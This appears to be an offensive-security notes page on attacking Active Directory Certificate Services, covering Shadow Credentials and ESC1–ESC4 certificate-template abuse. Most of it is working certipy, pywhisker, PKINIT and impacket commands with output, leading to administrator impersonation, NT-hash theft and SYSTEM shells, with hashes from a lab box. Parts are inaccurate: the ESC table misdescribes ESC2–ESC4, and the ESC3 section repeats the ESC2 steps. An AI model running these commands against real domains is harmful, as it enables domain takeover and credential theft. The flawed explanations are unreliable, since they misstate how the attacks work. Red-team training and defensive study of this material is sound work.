---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ADCS

**ADCS (Active Directory Certificate Services)** is a Windows Server role that provides certificate-based authentication and Public Key Infrastructure (PKI) functionality in AD environments. It runs as a service and communicates over TCP `135` and dynamic RPC ports, primarily for certificate issuance and management. If Web Enrollment or related features are enabled, it may also use ports `80` and `443`.

{% hint style="info" %}
Tools like `certipy` interact with ADCS over these ports, particularly via RPC.
{% endhint %}

**ADCS** is like an internal digital ID system for a Windows domain. Instead of printing physical ID cards, it **issues digital certificates** **that users and computers can use to log in**, encrypt communications, or sign data. These certificates are trusted across the domain, so if an attacker can trick ADCS into giving them a certificate, it's similar to getting a valid employee badge — they can **impersonate someone else** and gain access.

## Shadow Credentials

The **Shadow Credentials** attack abuses the `msDS-KeyCredentialLink` attribute in AD to add a malicious authentication certificate to an account — typically a service or privileged account. This allows the attacker to **impersonate** the target account via certificate-based authentication (PKINIT), **without needing their password or hash**.

{% hint style="warning" %}
#### Requirements:

* The attacker **must have** `Write` **access** to the target's `msDS-KeyCredentialLink` attribute.
* ADCS must be configured to allow **certificate-based authentication (PKINIT)**.
{% endhint %}

{% tabs %}
{% tab title="certipy" %}
`certipy shadow auto` automates the shadow credentials attack by injecting a forged certificate into a target account's `msDS-KeyCredentialLink` attribute. It authenticates with provided credentials, adds the malicious credential, and requests a certificate tied to the target:

```bash
certipy shadow auto -u <user@domain> -p <pass> -account 'ca_svc' -dc-ip <dc-ip>
```

This results in the two files and a hash:

* **`.pfx`** : contains the **certificate and private key** the attacker got from the CA. It can be imported into Windows or used with tools that support PKI authentication to authenticate as the user.
* **`.ccache`**: this is a **Kerberos credential cache** file, generated after using the certificate for PKINIT (certificate-based Kerberos auth). It allows us to **authenticate with Kerberos tickets as that user** without a password or NT hash. Tools like `impacket` or `kinit` can use it to get tickets.
* **NT hash:** this is extracted from memory (via the Key Credential attack), giving us a password-equivalent credentia**l** we can use in typical NTLM-based attacks like Pass-the-Hash or SMB authentication.
{% endtab %}

{% tab title="pywhisker" %}
[`pyWhisker`](https://github.com/ShutdownRepo/pywhisker?tab=readme-ov-file) manipulates the `msDS-KeyCredentialLink` attribute to gain control over a user or computer object. It leverages Impacket and a Python version of DSInternals, working with [PKINIT tools](https://github.com/dirkjanm/PKINITtools) to enable full exploitation on Unix systems.

#### **Requirements:**

* Domain Functional Level: **Windows Server 2016+**
* At least one **DC running Windows Server 2016+**
* The DC must have a **certificate and private key** (e.g., via AD CS or PKI)
* Attacker must control an account with **write access** to `msDS-KeyCredentialLink`

> ⚠️ Without the DC's cert/key, a `KDC_ERR_PADATA_TYPE_NOSUPP (16)` error will occur during the AS-REQ process.

{% code overflow="wrap" %}
```bash
pywhisker -d '<domain>' -u '<owned-acc>' -p '<pass>' --target '<target-acc>' --action 'add' --filename <filename>
...
[*] Updating the msDS-KeyCredentialLink attribute of ca_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: ca_svc.pfx
[*] Must be used with password: a3JnpFX9ZuxEXbCrPPxy
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```
{% endcode %}

Once the values are generated and added, a TGT can be requested ([gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)) and the NT hash can then be recovered ([getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py)):

{% code overflow="wrap" %}
```bash
# Request TGT
gettgtpkinit.py -cert-pfx <pfx-file> -pfx-pass <pass> <domain>/<user> <ccache-file>

# Recover NT hash
getnthash.py -key <key> <domain>/<user>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## ESC Attacks

{% hint style="info" %}
The terms **ESC1**, **ESC2**, etc., come from a **threat model and classification system** introduced by SpecterOps. These labels don’t stand for acronyms — **ESC** simply means **ESCalation** — and they’re followed by a number to identify different types of attack paths related to ADCS.
{% endhint %}

<table><thead><tr><th width="79.6666259765625">Label</th><th width="375.3333740234375">Description</th><th>Key Risk</th></tr></thead><tbody><tr><td><strong>ESC1</strong></td><td>Weak template allows users to request certs for others (incl. admins)</td><td>Identity impersonation</td></tr><tr><td><strong>ESC2</strong></td><td>Misconfigured template allows user-supplied Subject Alternative Name (SAN)</td><td>Identity impersonation</td></tr><tr><td><strong>ESC3</strong></td><td>Vulnerable template allows enrollment with client authentication and no manager approval</td><td>Template abuse</td></tr><tr><td><strong>ESC4</strong></td><td>Control over <code>Cert Publisher</code> user lets attacker modify templates</td><td>Template abuse (leads to ESC1)</td></tr></tbody></table>

{% hint style="danger" %}
This **ESC4 → ESC1** chain is especially dangerous as it **leverages legitimate ADCS functionality**, making detection difficult. Issued certificates may remain valid for years, providing **long-term persistence** unless explicitly revoked. For an example of this attack chain see [EscapeTwo](https://x7331.gitbook.io/boxes/boxes/easy/escapetwo#privilege-escalation).
{% endhint %}

The first step in all ESC attacks is to **identify a vulnerable template**:

{% hint style="success" %}
A NT hash can be also used with the `-hashes <NT-hash` option.
{% endhint %}

{% code overflow="wrap" %}
```bash
# Test for vulnerable templates
$ certipy find -u <user>@<domain> -p <pass> -stdout -vuln
...
    [!] Vulnerabilities
      ESC1  : '<domain>\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
      ESC2  : '<domain>\\Domain Users' can enroll and template can be used for any purpose
      ESC3  : '<domain>\\Domain Users' can enroll and template has Certificate Request Agent EKU set
      ESC4  : User has dangerous permissions.
```
{% endcode %}

### Identity Hijack (ESC1)

Once the template is misconfigured, the attacker can request a certificate for a privileged account like a `Domain Admin`. Because validation is bypassed, ADCS issues a valid certificate, allowing the attacker to authenticate as that user, extract credentials (e.g., NTLM hashes), and escalate to full domain control.

{% tabs %}
{% tab title="1. Request Certificate" %}
{% code overflow="wrap" %}
```bash
# Request a certificate for the Administrator account
$ certipy req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb -target dc01.sequel.htb -target-ip 10.10.11.51
...
[*] Wrote certificate and private key to 'administrator.pfx'
```
{% endcode %}
{% endtab %}

{% tab title="2. Authenticate" %}
{% code overflow="wrap" %}
```bash
# Authenticate as the administrator using the PFX file
$ certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
Certipy v5.0.2 - by Oliver Lyak (ly4k)
...
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```
{% endcode %}
{% endtab %}

{% tab title="3. Impersonate" %}
We can then use `impacket-psexec` to get a `SYSTEM` shell:

```bash
$ impacket-psexec administrator@<dc-ip> -hashes :<NT-hash>
```

We can also export and use the TGT ticket (`administrator.ccache`):

```bash
$ export KRB5CCNAME=administrator.ccache
$ impacket-psexec administrator@<domain> -k -no-pass
```
{% endtab %}
{% endtabs %}

### Identity Hijack (ESC2)

**ESC2** is an attack where an attacker abuses **misconfigured certificate templates** that allow low-privileged users to **enroll for certificates** with **any Subject Alternative Name (SAN)**, such as an admin's UPN. If `ManagerApproval` is not required and `Client Authentication` is enabled, the attacker can request a cert that impersonates a privileged user and use it to authenticate.

{% tabs %}
{% tab title="1. Any Cert" %}
Request an any purpose certificate:

{% hint style="warning" %}
In this step, we use the vulnerable template's name.
{% endhint %}

{% code overflow="wrap" %}
```bash
certipy req -ca <ca-name> -dc-ip <dc-ip> -u <user>@<domain> -p <pass> -template <vulnerable-to-ESC2-template-name> -target <domain-fqdn>
```
{% endcode %}
{% endtab %}

{% tab title="2. Admin Cert" %}
Request a certificate on behalf of the `Domain Admin`:

{% hint style="warning" %}
In this step, we can use a built-in template, such as `USER`, that allows certificate enrollment for regular users.
{% endhint %}

{% code overflow="wrap" %}
```bash
certipy req -ca SHIELD-DC4-CA -dc-ip <dc-ip> -u <user>@<domain> -p <pass> -template <template-name> -target <domain-fqdn> -on-behalf-of '<domain>\administrator' -pfx <pfx-file>
```
{% endcode %}
{% endtab %}

{% tab title="3. Auth" %}
Get the TGT and/or NT hash:

```bash
certipy auth -pfx administrator.pfx
```
{% endtab %}

{% tab title="4. Impersonate" %}
Gain a `SYSTEM` shell:

```bash
impacket-smbexec administrator@<domain-fqdn> -hashes :<NT-hash>
```

or use the TGT:

```bash
$ export KRB5CCNAME=administrator.ccache
$ impacket-psexec administrator@<domain-fqdn> -k -no-pass
```
{% endtab %}
{% endtabs %}

### Template Abuse (ESC3)

{% hint style="warning" %}
ESC2 vs ESC3

* **ESC2**: Template allows **any purpose** usage + lacks protections (like no approval or manager check)
* **ESC3**: Template has **Certificate Request Agent** EKU and lacks approval
{% endhint %}

**ESC3** involves a misconfigured certificate template that has the **Certificate Request Agent Extended Key Usage (EKU)** setting. This allows any user with enrollment rights to request certificates on behalf of other users — including `Domain Admins` — enabling impersonation and privilege escalation.

{% tabs %}
{% tab title="1. Any Cert" %}
Request an any purpose certificate:

{% hint style="warning" %}
In this step, we use the vulnerable template's name.
{% endhint %}

{% code overflow="wrap" %}
```bash
certipy req -ca <ca-name> -dc-ip <dc-ip> -u <user>@<domain> -p <pass> -template <vulnerable-to-ESC2-template-name> -target <domain-fqdn>
```
{% endcode %}
{% endtab %}

{% tab title="2. Admin Cert" %}
Request a certificate on behalf of the `Domain Admin`:

{% hint style="warning" %}
In this step, we can use a built-in template, such as `USER`, that allows certificate enrollment for regular users.
{% endhint %}

{% code overflow="wrap" %}
```bash
certipy req -ca SHIELD-DC4-CA -dc-ip <dc-ip> -u <user>@<domain> -p <pass> -template <template-name> -target <domain-fqdn> -on-behalf-of '<domain>\administrator' -pfx <pfx-file>
```
{% endcode %}
{% endtab %}

{% tab title="3. Auth" %}
Get the TGT and/or NT hash:

```bash
certipy auth -pfx administrator.pfx
```
{% endtab %}

{% tab title="4. Impersonate" %}
Gain a `SYSTEM` shell:

```bash
impacket-smbexec administrator@<domain-fqdn> -hashes :<NT-hash>
```

or use the TGT:

```bash
$ export KRB5CCNAME=administrator.ccache
$ impacket-psexec administrator@<domain-fqdn> -k -no-pass
```
{% endtab %}
{% endtabs %}

### Template Abuse (ESC4)

**ESC4** is a misconfiguration where a low-privileged user can take control of another account — typically a member of the `Cert Publishers` group. Since `Cert Publishers` can modify certificate templates, gaining control of such an account lets an attacker edit a template to make it vulnerable to **ESC1**. This means weakening the template's settings to allow certificate requests without proper validation or approval, enabling certificate-based impersonation of privileged users.

{% code overflow="wrap" %}
```bash
# Make the template vulnerable to ESC1
$ certipy template -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -write-default-configuration
...
[*] Successfully updated 'DunderMifflinAuthentication'
```
{% endcode %}

## Resources

* SpecterOps _Certified Pre-Owned (2021)_ whitepaper ([article](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf))
* RBT's short articles and video walkthrough about the ESCs attacks ([ESC1](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc1/), [ESC2](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc2/), [ESC3](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc3/), [ESC4](https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/))
